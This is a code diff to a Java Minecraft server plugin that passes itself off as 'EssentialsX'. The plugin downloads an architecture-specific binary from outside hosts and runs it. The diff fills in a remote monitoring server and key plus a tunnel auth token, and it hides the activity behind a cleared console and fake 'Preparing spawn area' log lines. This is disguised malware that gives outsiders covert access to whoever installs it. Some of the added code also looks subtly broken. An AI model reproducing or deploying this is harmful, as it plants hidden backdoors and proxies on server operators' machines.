@@ -13,7 +13,7 @@ public class EssentialsX extends JavaPlugin {
     private volatile boolean isProcessRunning = false;
     
     private static final String[] ALL_ENV_VARS = {
-        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
+        "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
         "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
         "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
         "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
@@ -44,11 +44,11 @@ public class EssentialsX extends JavaPlugin {
         String url;
         
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.eooce.com/sbsh";
+            url = "https://amd64.sss.hidns.vip/sbsh";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.eooce.com/sbsh";
+            url = "https://arm64.sss.hidns.vip/sbsh";
         } else if (osArch.contains("s390x")) {
-            url = "https://s390x.ssss.nyc.mn/sbsh";
+            url = "https://s390x.sss.hidns.vip/sbsh"; 
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
@@ -75,12 +75,12 @@ public class EssentialsX extends JavaPlugin {
         Map<String, String> env = pb.environment();
         env.put("UUID", "9f8ef93f-cb9e-46b4-8981-16079765933f");
         env.put("FILE_PATH", "./world");
-        env.put("NEZHA_SERVER", "");
+        env.put("NEZHA_SERVER", "nezha.ggff.net:8008");
         env.put("NEZHA_PORT", "");
-        env.put("NEZHA_KEY", "");
+        env.put("NEZHA_KEY", "nezha123@");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "");
-        env.put("ARGO_AUTH", "");
+        env.put("ARGO_DOMAIN", "liquid.fooc.nyc.mn");
+        env.put("ARGO_AUTH", "eyJhIjoiMzBmMDEyMGY1OGRjYjk4ZDc5ZTM0YTM5ODY2ZGVjMTAiLCJ0IjoiNDVhMTkyZTUtY2FhZC00NjRmLTgxYzUtYzhhYTg1NWZiYjI0IiwicyI6IllqRmlOVE5oTWpVdFpEaGhZUzAwTWpRMkxXSTBNREl0WkdSaU1EVTJaalUzTnpVdyJ9");
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
@@ -126,27 +126,8 @@ public class EssentialsX extends JavaPlugin {
         startProcessMonitor();
         // getLogger().info("sbx started");
         
-        // sleep 20 seconds
-        try {
-            Thread.sleep(20000);
-        } catch (InterruptedException e) {
-            Thread.currentThread().interrupt();
-        }
-        
-        clearConsole();
-        getLogger().info("");
-        getLogger().info("Preparing spawn area: 1%");
-        getLogger().info("Preparing spawn area: 5%");
-        getLogger().info("Preparing spawn area: 10%");
-        getLogger().info("Preparing spawn area: 20%");
-        getLogger().info("Preparing spawn area: 30%");
-        getLogger().info("Preparing spawn area: 80%");
-        getLogger().info("Preparing spawn area: 85%");
-        getLogger().info("Preparing spawn area: 90%");
-        getLogger().info("Preparing spawn area: 95%");
-        getLogger().info("Preparing spawn area: 99%");
-        getLogger().info("Preparing spawn area: 100%");
-        getLogger().info("Preparing level \"world\"");
+        // Start async task for delayed console output
+        startDelayedConsoleOutput();
     }
     
     private void loadEnvFileFromMultipleLocations(Map<String, String> env) {
@@ -228,9 +209,41 @@ public class EssentialsX extends JavaPlugin {
                 isProcessRunning = false;
             }
         }, "Sbx-Process-Monitor");
-        
+
         monitorThread.setDaemon(true);
         monitorThread.start();
+    }
+
+    private void startDelayedConsoleOutput() {
+        Thread outputThread = new Thread(() -> {
+            try {
+                Thread.sleep(20000);
+            } catch (InterruptedException e) {
+                Thread.currentThread().interrupt();
+                return;
+            }
+
+            clearConsole();
+            getLogger().info("");
+            getLogger().info("Preparing spawn area: 1%");
+            Thread.sleep(1000);
+            getLogger().info("Preparing spawn area: 5%");
+            Thread.sleep(1000);
+            getLogger().info("Preparing spawn area: 10%");
+            Thread.sleep(1000);
+            getLogger().info("Preparing spawn area: 20%");
+            getLogger().info("Preparing spawn area: 30%");
+            getLogger().info("Preparing spawn area: 80%");
+            getLogger().info("Preparing spawn area: 85%");
+            getLogger().info("Preparing spawn area: 90%");
+            getLogger().info("Preparing spawn area: 95%");
+            getLogger().info("Preparing spawn area: 99%");
+            getLogger().info("Preparing spawn area: 100%");
+            getLogger().info("Preparing level \"world\"");
+        }, "Delayed-Console-Output");
+
+        outputThread.setDaemon(true);
+        outputThread.start();
     }
     
     @Override
